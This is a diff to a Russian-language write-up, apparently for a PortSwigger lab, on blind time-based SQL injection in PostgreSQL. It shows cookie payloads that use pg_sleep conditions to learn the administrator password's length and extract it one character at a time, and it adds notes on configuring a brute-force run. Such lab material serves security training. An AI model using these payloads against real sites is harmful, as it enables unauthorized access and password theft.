@@ -37,7 +37,15 @@ Cookie: TrackingId=XJiQEzhDY6BBK3sr' || (SELECT CASE WHEN (username='administrat
 ```sql
 Cookie: TrackingId=XJiQEzhDY6BBK3sr' || (SELECT CASE WHEN (username='administrator') AND LENGTH(password)>20 THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM USERS)--
 ```
+
 Определяем сам пароль:
 ```sql
 Cookie: TrackingId=XJiQEzhDY6BBK3sr' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM USERS)--
-```
+
+В рамках брутфорса необходимо создать настройку:
+
+![PortSwigger](../Drawing/Drawing_36.png)
+
+Для того, чтобы у нас не было множество ложных ответов = 5 секундам.
+
+![PortSwigger](../Drawing/Drawing_37.png)
